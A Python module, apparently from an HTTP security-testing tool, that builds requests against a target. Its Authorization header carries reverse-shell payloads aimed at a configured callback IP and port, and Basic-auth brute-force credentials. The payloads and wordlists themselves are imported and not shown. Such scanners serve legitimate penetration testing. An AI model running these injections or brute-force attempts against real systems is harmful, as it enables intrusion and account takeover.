from headers.static_values import *
from worker import *
from utils import *
import requests

class Authorization():

    def __init__(self, destination):
        self.destination       = destination
        self.mime_types        = MimeTypes.get_mime_list()
        self.bruteforce_list   = BruteForce.get_userpass_list()
        self.payloads          = Payloads.get_payload_list(Config.revshell_ip, Config.revshell_port)
        self.test_array        = []

    def revshell_tests(self):
        for payload in self.payloads:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = payload,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Authorization" : payload
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def bruteforce_tests(self):
        for userpass in self.bruteforce_list:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = userpass,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Authorization" : "Basic " + userpass
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def generate_tests(self):
        if Config.test_level >= Config.TEST_LEVEL_OPTIMAL:
            self.revshell_tests()
            self.bruteforce_tests()

    def get_tests(self):
        self.generate_tests()
        return self.test_array